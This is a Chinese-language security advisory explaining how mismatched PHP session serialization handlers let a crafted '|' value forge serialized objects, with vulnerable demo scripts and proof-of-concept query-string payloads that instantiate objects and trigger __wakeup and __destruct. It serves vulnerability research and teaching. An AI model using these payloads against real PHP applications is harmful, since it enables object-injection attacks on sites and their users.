# PHP Session 序列化及反序列化处理器设置使用不当带来的安全隐患

PHP Session 序列化及反序列化处理器
-----------------------

* * *

PHP 内置了多种处理器用于存取 $_SESSION 数据时会对数据进行序列化和反序列化，常用的有以下三种，对应三种不同的处理格式：

| 处理器 | 对应的存储格式 |
| --- | --- |
| php | 键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值 |
| php_binary | 键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数反序列处理的值 |
| php_serialize  
(php>=5.5.4) | 经过 serialize() 函数反序列处理的数组 |

配置选项 session.serialize_handler
------------------------------

* * *

PHP 提供了 session.serialize_handler 配置选项，通过该选项可以设置序列化及反序列化时使用的处理器：

`session.serialize_handler "php" PHP_INI_ALL`

安全隐患
----

通过上面对存储格式的分析，如果 PHP 在反序列化存储的 $_SESSION 数据时的使用的处理器和序列化时使用的处理器不同，会导致数据无法正确反序列化，通过特殊的构造，甚至可以伪造任意数据：）

```
$_SESSION['ryat'] = '|O:8:"stdClass":0:{}';

```

例如上面的 $_SESSION 数据，在存储时使用的序列化处理器为 php_serialize，存储的格式如下：

```
a:1:{s:4:"ryat";s:20:"|O:8:"stdClass":0:{}";}

```

在读取数据时如果用的反序列化处理器不是 php_serialize，而是 php 的话，那么反序列化后的数据将会变成：

```
// var_dump($_SESSION);
array(1) {
  ["a:1:{s:4:"ryat";s:20:""]=>
  object(stdClass)#1 (0) {
  }
}

```

可以看到，通过注入`|`字符伪造了对象的序列化数据，成功实例化了 stdClass 对象：）

实际利用
----

* * *

### i）当 session.auto_start＝On 时：

当配置选项 session.auto_start＝On，会自动注册 Session 会话，因为该过程是发生在脚本代码执行前，所以在脚本中设定的包括序列化处理器在内的 session 相关配选项的设置是不起作用的，因此一些需要在脚本中设置序列化处理器配置的程序会在 session.auto_start＝On 时，销毁自动生成的 Session 会话，然后设置需要的序列化处理器，再调用 session_start() 函数注册会话，这时如果脚本中设置的序列化处理器与 php.ini 中设置的不同，就会出现安全问题，如下面的代码：

```
//foo.php

if (ini_get('session.auto_start')) {
    session_destroy();
}

ini_set('session.serialize_handler', 'php_serialize');
session_start();

$_SESSION['ryat'] = $_GET['ryat'];

```

当第一次访问该脚本，并提交数据如下：

```
foo.php?ryat=|O:8:"stdClass":0:{}

```

脚本会按照 php_serialize 处理器的序列化格式存储数据：

```
a:1:{s:4:"ryat";s:20:"|O:8:"stdClass":0:{}";}

```

当第二次访问该脚本时，PHP 会按照 php.ini 里设置的序列化处理器反序列化存储的数据，这时如果 php.ini 里设置的是 php 处理器的话，将会反序列化伪造的数据，成功实例化了 stdClass 对象：）

这里需要注意的是，因为 PHP 自动注册 Session 会话是在脚本执行前，所以通过该方式只能注入 PHP 的内置类。

### ii）当 session.auto_start＝Off 时：

当配置选项 session.auto_start＝Off，两个脚本注册 Session 会话时使用的序列化处理器不同，就会出现安全问题，如下面的代码：

```
//foo1.php

ini_set('session.serialize_handler', 'php_serialize');
session_start();

$_SESSION['ryat'] = $_GET['ryat'];


//foo2.php

ini_set('session.serialize_handler', 'php');
//or session.serialize_handler set to php in php.ini 
session_start();

class ryat {
    var $hi;

    function __wakeup() {
        echo 'hi';
    }
    function __destruct() {
        echo $this->hi;
    }
}

```

当访问 foo1.php 时，提交数据如下：

```
foo1.php?ryat=|O:4:"ryat":1:{s:2:"hi";s:4:"ryat";}

```

脚本会按照 php_serialize 处理器的序列化格式存储数据，访问 foo2.php 时，则会按照 php 处理器的反序列化格式读取数据，这时将会反序列化伪造的数据，成功实例化了 ryat 对象，并将会执行类中的 __wakeup 方法和 __destruct 方法：）

### iii）其他利用方式？

请自行发掘：）

from:[http://www.80vul.com/pch/pch-013.txt](http://www.80vul.com/pch/pch-013.txt)